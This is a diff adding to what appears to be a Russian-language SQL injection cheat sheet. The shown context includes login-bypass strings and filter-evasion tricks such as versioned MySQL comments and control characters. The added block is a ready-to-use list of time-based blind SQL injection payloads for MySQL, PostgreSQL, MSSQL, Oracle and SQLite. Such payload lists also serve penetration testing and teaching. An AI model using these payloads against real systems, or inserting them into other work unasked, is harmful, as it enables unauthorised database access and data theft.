@@ -118,3 +118,25 @@ admin") or "1"="1"/*
 
 Например, добавив управляющие символы (https://x.com/oualilweb/status/1754245617470066755) , типа %00, %0A и др. или вставив математические операции ('AND'1'=1*1 вместо 'AND'1'='1') или добавив специфичные комментарии типа /*!50000%55nIoN*/ /*!50000%53eLeCt*/ и многое другое.
 ```
+
+```
+MySQL (string concat and logical ops)
+1' + sleep(10)
+1' and sleep(10)
+1' && sleep(10)
+1' | sleep(10)
+
+PostgreSQL (only support string concat)
+1' || pg_sleep(10)
+
+MSQL
+1' WAITFOR DELAY '0:0:10'
+
+Oracle
+1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+
+SQLite
+1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+```
